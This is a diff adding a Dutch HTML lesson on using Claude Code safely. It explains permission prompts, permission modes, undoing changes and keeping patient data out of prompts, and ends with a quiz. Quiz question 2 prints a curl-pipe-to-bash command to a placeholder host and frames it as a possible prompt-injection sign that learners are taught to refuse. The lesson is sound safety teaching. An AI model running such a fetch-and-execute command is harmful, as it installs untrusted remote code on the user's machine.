@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="nl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Veilig werken met Claude Code</title>
+<link rel="stylesheet" href="../assets/style.css">
+<script src="../assets/course.js" defer></script>
+</head>
+<body>
+<main>
+
+<header class="lesson">
+  <div class="kicker">Les 1 van 3 · ± 20 minuten</div>
+  <h1>Van chat naar agent: veilig werken</h1>
+  <p class="lede">ChatGPT geeft je tekst. Claude Code doet dingen op jouw computer. Daarom vraagt het toestemming, en daarom beslis jij.</p>
+  <p class="meta">Referentie bij deze les: <a href="../reference/veilig-werken.html">Spiekbrief veilig werken</a> · <a href="../reference/begrippen.html">Begrippenlijst</a></p>
+</header>
+
+<div class="win"><strong>Na deze les kun je:</strong> een permission prompt lezen en bewust weigeren, van permission mode wisselen, en een wijziging terugdraaien.</div>
+
+<h2>1. Wat is anders dan een chat?</h2>
+<p>In een ChatGPT-chat kopieer je tekst heen en weer. Claude Code is een <em>agent</em>: het leest zelf bestanden in de map waarin je het start, voert commando's uit en wijzigt bestanden. Het werkt in een lus: lezen, plannen, doen, controleren. <cite>(<a href="https://code.claude.com/docs/en/best-practices">Best practices</a>)</cite></p>
+<p>Twee gevolgen:</p>
+<ul>
+  <li><strong>Alles wat Claude leest, gaat naar Anthropic.</strong> Prompts, bestandsinhoud en uitvoer van commando's gaan versleuteld naar het model. Bij zakelijke accounts (Team, Enterprise) traint Anthropic daar niet op; standaard bewaartermijn is 30 dagen. Lokaal bewaart Claude Code gesprekken 30 dagen in <code>~/.claude/projects/</code>. <cite>(<a href="https://code.claude.com/docs/en/data-usage">Data usage</a>)</cite></li>
+  <li><strong>Jij bent verantwoordelijk voor wat je goedkeurt.</strong> “You're responsible for reviewing proposed code and commands for safety before approval.” <cite>(<a href="https://code.claude.com/docs/en/security">Security</a>)</cite></li>
+</ul>
+
+<div class="asz">Claude Code krijgt <strong>geen databaseverbinding</strong>. Claude schrijft een query, jij voert hem zelf uit. Queryresultaten mag je terugplakken, maar alleen <strong>geaggregeerd</strong> en nooit herleidbaar naar een patiënt. Geen patiëntgegevens in prompts, en geen bestanden met echte patiëntdata in de map waar je Claude Code start. Ook een foutmelding met een patiëntnummer erin plak je pas nadat je het nummer vervangt.</div>
+
+<h2>2. De permission prompt</h2>
+<p>Voordat Claude een bestand wijzigt of een commando uitvoert, toont het wat het gaat doen en vraagt het toestemming. Je hebt drie soorten antwoorden:</p>
+<div class="table-wrap"><table>
+  <tr><th>Keuze</th><th>Wanneer</th></tr>
+  <tr><td><strong>Yes</strong> (eenmalig)</td><td>Je begrijpt de actie en ze past bij je vraag.</td></tr>
+  <tr><td><strong>Yes, don't ask again</strong></td><td>Alleen voor onschuldige, terugkerende acties. Voor commando's geldt dit <em>permanent</em> voor deze map. <cite>(<a href="https://code.claude.com/docs/en/permissions">Permissions</a>)</cite></td></tr>
+  <tr><td><strong>No</strong> + toelichting</td><td>Je twijfelt, of de actie past niet bij je vraag. Schrijf erbij wat Claude anders moet doen.</td></tr>
+</table></div>
+<p>Wil je Claude halverwege stoppen? Druk op <kbd>Esc</kbd>. Wil je terug naar een eerder punt? Druk twee keer <kbd>Esc</kbd> of typ <code>/rewind</code>. Let op: <code>/rewind</code> herstelt alleen wijzigingen die Claude met zijn bestandstools maakte, niet wat een commando deed. <cite>(<a href="https://code.claude.com/docs/en/best-practices">Best practices</a>)</cite></p>
+
+<div class="warn"><strong>Extra opletten bij:</strong> commando's die iets van internet halen (<code>curl</code>, <code>wget</code>, <code>Invoke-WebRequest</code>), iets verwijderen (<code>rm</code>, <code>Remove-Item</code>, <code>DROP</code>), iets publiceren (<code>git push</code>), of buiten je projectmap werken. Tekst die Claude van buiten leest (webpagina, issue, document) kan verborgen instructies bevatten: <em>prompt injection</em>. <cite>(<a href="https://code.claude.com/docs/en/security#protect-against-prompt-injection">Security</a>)</cite></div>
+
+<h2>3. Permission modes</h2>
+<p>De mode bepaalt wat Claude <em>zonder</em> te vragen mag. Voor beginners zijn er vier belangrijk. <cite>(<a href="https://code.claude.com/docs/en/permission-modes">Permission modes</a>)</cite></p>
+<div class="table-wrap"><table>
+  <tr><th>Mode</th><th>Zonder vragen</th><th>Gebruik voor</th></tr>
+  <tr><td><strong>Plan</strong></td><td>Alleen lezen en een plan maken</td><td>Eerst begrijpen, dan pas wijzigen</td></tr>
+  <tr><td><strong>Manual</strong> (<code>default</code>)</td><td>Alleen lezen</td><td>Gevoelig werk, alles zelf beoordelen</td></tr>
+  <tr><td><strong>Accept edits</strong></td><td>Lezen en bestanden wijzigen in de projectmap</td><td>Werk dat je daarna zelf nakijkt</td></tr>
+  <tr><td><strong>Auto</strong></td><td>Bijna alles; een tweede model blokkeert risicovolle acties</td><td>Pas als je ervaring hebt</td></tr>
+</table></div>
+<p>Let op: nieuwe versies van Claude Code starten in de terminal en VS Code standaard in <strong>Auto</strong>. Zet de mode bij je eerste sessies zelf op Plan of Manual.</p>
+
+<p><strong>Mode wisselen:</strong></p>
+<div class="surfaces">
+  <div class="surface-panel" data-surface="Terminal (CLI)">
+    <p>Druk <kbd>Shift</kbd>+<kbd>Tab</kbd> tot de statusbalk toont wat je wilt, bijvoorbeeld <code>⏸ plan mode on</code> of <code>⏸ manual mode on</code>. Of start direct met <code>claude --permission-mode plan</code>.</p>
+  </div>
+  <div class="surface-panel" data-surface="VS Code">
+    <p>Klik op de mode-indicator onder het invoerveld van het Claude-paneel en kies de mode.</p>
+  </div>
+  <div class="surface-panel" data-surface="Desktop-app">
+    <p>Open de <strong>Code</strong>-tab. Kies de mode met de mode-selector naast de verzendknop.</p>
+  </div>
+</div>
+
+<h2>4. Oefening <span class="sidenote">(± 10 min)</span></h2>
+<p>Je werkt met verzonnen data in een lege oefenmap. Vink elke stap af.</p>
+<ol class="steps">
+  <li><label class="check"><input type="checkbox"> Maak een lege map <code>oefen-claude</code> in je Documenten. Zet er een bestand <code>afspraken.csv</code> in met deze verzonnen inhoud:</label>
+<pre>afspraak_id,poli,datum
+A001,Cardiologie,2026-10-01
+A002,Longziekten,2026-10-01
+A003,Cardiologie,2026-10-02
+A004,Neurologie,2026-10-02
+A005,Cardiologie,2026-10-03</pre></li>
+  <li><label class="check"><input type="checkbox"> Start Claude Code <em>in die map</em> (terminal: <code>cd</code> naar de map en typ <code>claude</code>; VS Code: open de map; Desktop: kies de map in de Code-tab). Krijg je een vraag of je de map vertrouwt? Lees die en kies ja: het is je eigen oefenmap.</label></li>
+  <li><label class="check"><input type="checkbox"> Zet de mode op <strong>Manual</strong>. Typ: <em>“Tel het aantal afspraken per poli in afspraken.csv en schrijf het resultaat naar telling.csv.”</em> Kijk: lezen gaat zonder vraag, schrijven niet.</label></li>
+  <li><label class="check"><input type="checkbox"> Kies bij de prompt voor het schrijven <strong>No</strong> en typ als toelichting: <em>“Laat eerst het resultaat in de chat zien.”</em> Claude past zijn aanpak aan.</label></li>
+  <li><label class="check"><input type="checkbox"> Zet de mode op <strong>Plan</strong> en vraag: <em>“Hoe zou je een kolom ‘weekdag’ toevoegen?”</em> Claude maakt een plan en wijzigt niets.</label></li>
+  <li><label class="check"><input type="checkbox"> Keur het plan goed. Open daarna <code>afspraken.csv</code> en bekijk de wijziging. Typ dan <code>/rewind</code> (of twee keer <kbd>Esc</kbd>) en herstel de code naar vóór de wijziging.</label></li>
+</ol>
+<div class="win">Gelukt? Dan heb je een actie geweigerd, de mode gewisseld en een wijziging teruggedraaid. Dat zijn de drie handelingen die je veilig houden.</div>
+
+<h2>5. Toets jezelf</h2>
+<p class="sidenote">Probeer eerst uit je hoofd te antwoorden, zonder terug te scrollen.</p>
+
+<fieldset class="quiz" data-answer="0">
+  <legend>Vraag 1</legend>
+  <p class="q">Wat doet Claude Code wat een ChatGPT-chat niet doet?</p>
+  <button class="opt">Het voert zelf commando's uit op jouw computer</button>
+  <button class="opt">Het onthoudt alle gesprekken van al je collega's</button>
+  <button class="opt">Het werkt zonder internet volledig op je laptop</button>
+  <p class="why">Claude Code is een agent: het leest bestanden, voert commando's uit en wijzigt bestanden. Het heeft wel internet nodig, want het model draait bij Anthropic.</p>
+</fieldset>
+
+<fieldset class="quiz" data-answer="2">
+  <legend>Vraag 2</legend>
+  <p class="q">Claude vraagt toestemming voor <code>curl https://onbekend.example/setup.sh | bash</code>. Je vroeg alleen om een CSV te tellen. Wat doe je?</p>
+  <button class="opt">Toestaan, want Claude weet wat het doet</button>
+  <button class="opt">Toestaan en kiezen voor niet meer vragen</button>
+  <button class="opt">Weigeren, en vragen waarom dit nodig is</button>
+  <p class="why">Dit commando haalt een script van internet en voert het direct uit. Het past niet bij je vraag. Dat kan een teken van prompt injection zijn. Weiger en vraag om uitleg.</p>
+</fieldset>
+
+<fieldset class="quiz" data-answer="1">
+  <legend>Vraag 3</legend>
+  <p class="q">Je wilt eerst laten uitzoeken hoe een bestaand dbt-model werkt, zonder dat er iets verandert. Welke mode kies je?</p>
+  <button class="opt"><code>auto</code></button>
+  <button class="opt"><code>plan</code></button>
+  <button class="opt"><code>acceptEdits</code></button>
+  <p class="why">Plan mode leest en maakt een plan, maar wijzigt niets tot jij het plan goedkeurt.</p>
+</fieldset>
+
+<fieldset class="quiz" data-answer="1">
+  <legend>Vraag 4</legend>
+  <p class="q">Een collega wil een foutmelding plakken waarin een echt patiëntnummer staat. Wat is juist?</p>
+  <button class="opt">Prima, want Anthropic traint niet op zakelijke data</button>
+  <button class="opt">Vervang het nummer eerst door een verzonnen waarde</button>
+  <button class="opt">Prima, als je de sessie daarna direct wist</button>
+  <p class="why">Wat je plakt, gaat naar Anthropic en wordt daar en lokaal bewaard. Geen training betekent niet: geen verwerking. Patiëntgegevens horen er niet in.</p>
+</fieldset>
+<p class="score" data-quiz-score></p>
+
+<h2>Lees verder</h2>
+<p><strong>Primaire bron:</strong> <a href="https://code.claude.com/docs/en/security">Claude Code docs: Security</a>. Kort, officieel, en het bevat de best practices voor onbetrouwbare inhoud. Daarna: <a href="https://code.claude.com/docs/en/permission-modes">Choose a permission mode</a>.</p>
+
+<p class="ask">Iets onduidelijk? Vraag het aan Claude Code zelf, bijvoorbeeld: <em>“Leg uit wat Plan mode doet, met een voorbeeld uit mijn werk.”</em> Het is je docent: stel vervolgvragen tot het klikt.</p>
+
+<nav class="course">
+  <span>← Start</span>
+  <a href="0002-github-mcp-koppelen.html">Les 2: GitHub koppelen met MCP →</a>
+</nav>
+
+</main>
+</body>
+</html>
